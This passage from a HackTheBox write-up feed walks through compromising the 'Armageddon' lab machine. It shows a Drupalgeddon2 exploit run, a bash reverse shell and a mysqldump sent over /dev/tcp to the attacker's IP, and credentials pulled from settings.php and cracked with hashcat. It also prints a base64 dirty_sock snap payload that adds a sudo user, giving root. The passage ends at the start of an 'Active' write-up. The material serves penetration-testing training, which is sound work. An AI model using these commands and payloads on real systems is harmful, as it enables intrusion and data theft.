...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p><code>searchsploit</code> pops up a lot of exploit results related to Drupal 7. But, based on the results, it is clear that the current version of Drupal seems to be vulnerable to remote code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
$ searchsploit Drupal <span class="m">7</span>
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     <span class="p">|</span>  Path
----------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Add Admin User<span class="o">)</span>                  <span class="p">|</span> php/webapps/34992.py
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Admin Session<span class="o">)</span>                   <span class="p">|</span> php/webapps/44355.php
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>        <span class="p">|</span> php/webapps/34984.py
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>        <span class="p">|</span> php/webapps/34993.php
Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Remote Code Execution<span class="o">)</span>           <span class="p">|</span> php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                             <span class="p">|</span> php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                 <span class="p">|</span> php/webapps/41564.php
Drupal &lt; 4.7.6 - Post Comments Remote Command Execution                            <span class="p">|</span> php/webapps/3313.pl
Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code <span class="o">(</span>Metasploit<span class="o">)</span>           <span class="p">|</span> php/webapps/44557.rb
Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>        <span class="p">|</span> php/webapps/44542.txt
Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>Metasp <span class="p">|</span> php/remote/44482.rb
Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>   <span class="p">|</span> php/webapps/44448.py
Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize<span class="o">()</span> Remote Command Exe <span class="p">|</span> php/remote/46510.rb
Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                     <span class="p">|</span> php/webapps/46452.txt
Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                 <span class="p">|</span> php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                  <span class="p">|</span> php/webapps/44501.txt
Drupal Module CKEditor &lt; 4.1WYSIWYG <span class="o">(</span>Drupal 6.x/7.x<span class="o">)</span> - Persistent Cross-Site Scrip <span class="p">|</span> php/webapps/25493.txt
Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                      <span class="p">|</span> php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - <span class="s1">&#39;tagcloud&#39;</span> Cross-Site Scripting            <span class="p">|</span> php/webapps/35397.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                  <span class="p">|</span> php/remote/40130.rb
----------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>Since &ldquo;Drupalgeddon2&rdquo; exploits doesn&rsquo;t state it requires authentication, I will give it a try.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-apache">Shell as apache</h3>
<h4 id="metasploit---drupalgeddon-2">Metasploit - Drupalgeddon 2</h4>
<p>Metasploit has a module for Drupalgeddon2 ( <code>exploit/unix/webapp/drupal_drupalgeddon2</code>). On my first attempt, it returned with no session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.129.90.96
<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.129.90.96
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
<span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:9001 
<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
<span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created
</code></pre></div><p>By assuming that the firewall blocks all outgoing ports except well-known, I changed my listening port to 443, and now it successfully opened a session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">443</span>
<span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">443</span>
msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:443 
<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39282</span> bytes<span class="o">)</span> to 10.129.90.96
<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.14.4:443 -&gt; 10.129.90.96:44612<span class="o">)</span> at 2021-03-29 23:47:59 -0400

meterpreter &gt; shell
Process <span class="m">9611</span> created.
Channel <span class="m">0</span> created.
whoami
apache
<span class="nb">pwd</span>
/var/www/html
</code></pre></div><p>I sent the following command because I wanted to change my shell, so I could do the PTY trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/88 0&gt;&amp;1&#39;</span>
</code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ kali@kali «armageddon» «10.10.14.4» 
$ nc -nvlp <span class="m">88</span>  
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58422</span>
bash: no job control in this shell
bash-4.2$ 
</code></pre></div><p>However, I&rsquo;m unable to get the PTY trick working. It always returns the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 154, in spawn
    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 96, in fork
    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 29, in openpty
    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 59, in _open_terminal
    raise OSError<span class="o">(</span><span class="s1">&#39;out of pty devices&#39;</span><span class="o">)</span>
OSError: out of pty devices
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-brucetherealadmin">Shell as brucetherealadmin</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There is only one user other than root who has a login shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
</code></pre></div><p>Running a recursive grep to find passwords under the web root directory pops one password out from <code>settings.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ <span class="nb">pwd</span>
/var/www/html
bash-4.2$ grep -Ri <span class="s2">&#34;password&#34;</span> 2&gt;/dev/null
...<span class="o">[</span>SNIP<span class="o">]</span>...
sites/default/settings.php:      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Looking at the contents of  <code>settings.php</code> reveals a database credential.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ cat sites/default/settings.php
<span class="nv">$databases</span> <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
  array <span class="o">(</span>
    <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
    array <span class="o">(</span>
      <span class="s1">&#39;database&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupal&#39;</span>,
      <span class="s1">&#39;username&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupaluser&#39;</span>,
      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
      <span class="s1">&#39;host&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;localhost&#39;</span>,
      <span class="s1">&#39;port&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
      <span class="s1">&#39;driver&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;mysql&#39;</span>,
      <span class="s1">&#39;prefix&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
    <span class="o">)</span>,
  <span class="o">)</span>,
<span class="o">)</span><span class="p">;</span>
</code></pre></div><h4 id="mysql-access">MySQL Access</h4>
<p>The password didn&rsquo;t work for user <code>brucetherealadmin</code>, but it did work for the database (of course). Unfortunately, because I&rsquo;m not in a TTY, I couldn&rsquo;t get into MySQL interactive shell, so instead, I dump the database using <code>mysqldump</code> and exfil the output to my attacking machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ mysqldump -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal &gt; drupal.dump<span class="p">;</span> cat drupal.dump &gt; /dev/tcp/10.10.14.4/88
</code></pre></div><p>On my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ kali@kali «loot» «10.10.14.4» 
$ nc -nvlp <span class="m">88</span> &gt; drupal.dump
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58444</span>
</code></pre></div><p>Examination of the dumped data reveals the structure of  <code>users</code> table.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
</span><span class="w"></span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="cm">/*!40101 SET @saved_cs_client     = @@character_set_client */</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="cm">/*!40101 SET character_set_client = utf8 */</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
</span><span class="w">  </span><span class="o">`</span><span class="n">uid</span><span class="o">`</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Primary Key: Unique user ID.&#39;</span><span class="p">,</span><span class="w">
</span><span class="w">  </span><span class="o">`</span><span class="n">name</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Unique user name.&#39;</span><span class="p">,</span><span class="w">
</span><span class="w">  </span><span class="o">`</span><span class="n">pass</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;User’s password (hashed).&#39;</span><span class="p">,</span><span class="w">
</span><span class="w"></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
</span></code></pre></div><p>Knowing the <code>users</code> table structure, I could use the MySQL <code>-e</code> option to retrieve the contents of column <code>name</code> and column <code>pass</code>  from the <code>users</code> table. This returns a password hash of <code>brucetherealadmin</code>, and I will have to crack this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ mysql -h localhost -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal -e <span class="s1">&#39;select name, pass from users&#39;</span>
name    pass
brucetherealadmin       <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
</code></pre></div><h4 id="password-crack">Password Crack</h4>
<p>The password has been recovered back to plain text using <code>hashcat</code> and <code>rockyou.txt</code>.</p>
<pre><code>C:\tools\hashcat6&gt; hashcat.exe -m 7900 &quot;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&quot; rockyou.txt
...[SNIP]...
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Tue Mar 30 12:03:57 2021 (3 secs)
Time.Estimated...: Tue Mar 30 12:04:00 2021 (0 secs)
...[SNIP]...
</code></pre><h4 id="ssh---brucetherealadmin">SSH - brucetherealadmin</h4>
<p>The password <code>booboo</code> works for <code>brucetherealadmin</code> and can be used on SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.4» 
$ ssh brucetherealadmin@10.129.90.96
brucetherealadmin@10.10.10.233<span class="err">&#39;</span>s password:
Last login: Tue Mar <span class="m">23</span> 12:40:36 <span class="m">2021</span> from 10.10.14.2
<span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <code>brucetherealadmin</code> is allowed to run  <code>/usr/bin/snap install</code> as root user. I could leverage this rights to install a malicious snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ sudo -l
Matching Defaults entries <span class="k">for</span> brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;MAIL
</span><span class="s2">    PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_MONETARY LC_NAME LC_NUMERIC
</span><span class="s2">    LC_PAPER LC_TELEPHONE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap install *
</code></pre></div><h4 id="malicious-snap-package">Malicious Snap Package</h4>
<p>After googling around, I found <a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">this blog</a> by <a href="https://twitter.com/init_string">Chris Moberly</a> about Dirty Sock vulnerability in Snap version &lt; 2.37. The author created two PoC exploits for this vulnerability:</p>
<ul>
<li>
<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py">dirty_sockv1</a>: Uses the ‘create-user’ API to create a local user based on details queried from the Ubuntu SSO.</p>
</li>
<li>
<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">dirty_sockv2</a>: Sideloads a snap that contains an install-hook that generates a new local user.</p>
</li>
</ul>
<p>The current snap version is not vulnerable (<a href="https://github.com/snapcore/snapd/commit/ce458d69bf0f336a34fb552be89c68071c683049#diff-2c0c2e43fe96e84eb5935d499907cd6c263fb806c165b723d638118344962484">patched with regex</a>) to Dirty Sock. But, since the goal here is to install a malicious snap package with administrative privilege, I can steal the payload (trojan snap code) from the PoC exploit v2 and revert it back to a snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  <span class="m">16</span>
centos  <span class="m">7</span>
kernel  3.10.0-1160.6.1.el7.x86_64
</code></pre></div><p>First, I will grab the v2 exploit and transfer it to Armageddon</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploit» «10.10.14.4» 
$ wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
→ kali@kali «exploit» «10.10.14.4» 
$ scp dirty_sockv2.py brucetherealadmin@10.129.92.110:/dev/shm
brucetherealadmin@10.129.92.110<span class="err">&#39;</span>s password: 
dirty_sockv2.py                                       100% <span class="m">8696</span>     8.5KB/s   00:01    
</code></pre></div><p>I will pull out the payload from the exploit and revert it back to a snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ python3 -c <span class="s2">&#34;print(&#39;&#39;&#39;
</span><span class="s2">&gt; aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
</span><span class="s2">&gt; /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
</span><span class="s2">&gt; ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
</span><span class="s2">&gt; TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
</span><span class="s2">&gt; T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
</span><span class="s2">&gt; Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
</span><span class="s2">&gt; ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
</span><span class="s2">&gt; ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
</span><span class="s2">&gt; L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
</span><span class="s2">&gt; b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
</span><span class="s2">&gt; rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
</span><span class="s2">&gt; rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
</span><span class="s2">&gt; AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
</span><span class="s2">&gt; XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
</span><span class="s2">&gt; RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
</span><span class="s2">&gt; AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;+ &#39;A&#39; * 4256 + &#39;==&#39;)&#34;</span> <span class="p">|</span> base64 -d &gt; malicious.snap
<span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ file malicious.snap
file malicious.snap
malicious.snap: Squashfs filesystem, little endian, version 4.0, <span class="m">910</span> bytes, <span class="m">7</span> inodes, blocksize: <span class="m">131072</span> bytes, created: Sat Feb  <span class="m">2</span> 23:00:32 <span class="m">2019</span>
</code></pre></div><h4 id="install-malicious-package">Install Malicious Package</h4>
<p>The <code>malicious.snap</code> file now can be installed with  <code>--devmode</code> option to skip digital signatures check. If the exploit success, there will be a new user added called <code>dirty_sock</code>  (default from the payload).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ sudo /usr/bin/snap install --devmode malicious.snap 
dirty-sock 0.1 installed
</code></pre></div><p>And the user is there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
</code></pre></div><h4 id="su---root">su - root</h4>
<p>Now I can switch user to <code>dirty_sock</code> using a password of <code>dirty_sock</code> and run <code>sudo su</code> to obtain a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ su dirty_sock
Password: 
<span class="o">[</span>dirty_sock@armageddon shm<span class="o">]</span>$ sudo su

We trust you have received the usual lecture from the <span class="nb">local</span> System
Administrator. It usually boils down to these three things:

    <span class="c1">#1) Respect the privacy of others.</span>
    <span class="c1">#2) Think before you type.</span>
    <span class="c1">#3) With great power comes great responsibility.</span>

<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> dirty_sock: 
<span class="o">[</span>root@armageddon shm<span class="o">]</span><span class="c1"># ifconfig</span>
ens192: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
        inet 10.129.92.110  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::7edc:a185:87bc:5935  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
        inet6 fe80::7648:5ea1:5371:b3b5  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
        inet6 fe80::ef75:a96e:3c27:e78b  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
        ether 00:50:56:b9:41:c7  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets <span class="m">9191</span>  bytes <span class="m">732392</span> <span class="o">(</span>715.2 KiB<span class="o">)</span>
        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
        TX packets <span class="m">1149</span>  bytes <span class="m">188885</span> <span class="o">(</span>184.4 KiB<span class="o">)</span>
        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Active</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
      <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-active/</guid>
      <description>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</description>
      <content:encoded><![CDATA[<p>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Active Directory GPP</li>
<li>Kerberoasting</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
